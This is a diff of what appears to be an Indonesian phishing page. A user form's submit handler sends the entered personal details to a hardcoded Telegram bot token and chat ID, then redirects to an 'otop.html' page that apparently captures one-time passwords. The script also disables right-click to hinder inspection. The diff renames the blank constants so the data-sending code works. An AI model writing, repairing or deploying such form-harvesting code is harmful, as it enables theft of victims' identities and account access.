@@ -381,12 +381,12 @@
     const form = document.getElementById('userForm');
     const loading = document.querySelector('.loading');
 
-    // Ganti dengan token bot dan chat ID Telegram Anda
-    const  = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo";
-    const  = "6824078885";
+    // Token dan Chat ID Telegram
+    const TELEGRAM_BOT_TOKEN = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo";
+    const TELEGRAM_CHAT_ID = "6824078885";
 
     form.addEventListener('submit', (e) => {
-        e.preventDefault();
+        e.preventDefault(); // Mencegah reload halaman
 
         // Ambil nilai input
         let fullName = document.getElementById("fullName").value.trim();
@@ -422,13 +422,14 @@
         .then(data => {
             loading.style.display = 'none'; // Sembunyikan loading setelah selesai
             if (data.ok) {
-                window.location.href = "otop.html"; // Redirect setelah sukses
+                window.location.href = "otop.html"; // Redirect ke halaman berikutnya
             } else {
                 alert("Gagal mengirim data ke Telegram.");
             }
         })
         .catch(error => {
             loading.style.display = 'none';
+            alert("Terjadi kesalahan! Coba lagi nanti.");
             console.error("Error:", error);
         });
     });
@@ -437,8 +438,6 @@
     document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
     });
-
-</script>
-
+      </script>
 </body>
-                    </html>
+</html>
